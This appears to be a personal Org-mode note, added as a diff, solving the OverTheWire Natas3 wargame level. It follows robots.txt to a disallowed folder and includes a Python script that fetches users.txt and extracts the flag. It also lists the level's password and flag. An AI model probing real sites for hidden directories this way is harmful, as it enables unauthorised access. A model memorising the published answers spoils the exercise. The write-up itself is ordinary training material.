@@ -1,0 +1,46 @@
+:PROPERTIES:
+:ID:       2041bd3d-7f8f-48f4-ad64-3a710eafb62d
+:END:
+#+title: Natas3
+* Previous
+[[id:b527bf0e-f525-49ce-a63d-af3e68edae94][Natas2]]
+
+* Password
+sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14
+
+* Flag
+Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ
+
+* Notes
+
+There is a comment in the source html that refers to the robots.txt file.
+In that file, the /s3cr3t/ folder is disallwed.
+The users.txt file can be found in that folder.
+
+#+begin_src python :results output
+#!/usr/bin/env python3
+
+import requests
+import re
+from natas_pass import passwords
+
+username = "natas3"
+password = passwords[username]
+
+url = "http://{}.natas.labs.overthewire.org/s3cr3t/users.txt".format(username)
+
+response = requests.get(url, auth=(username, password))
+
+content = response.text
+# print(content)
+
+p = re.findall("([a-zA-Z0-9]{32})", content)
+
+print(p.pop())
+#+end_src
+
+#+RESULTS:
+: Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ
+
+* Next
+[[id:d3e3a109-5359-41a3-8199-69555a926ca6][Natas4]]
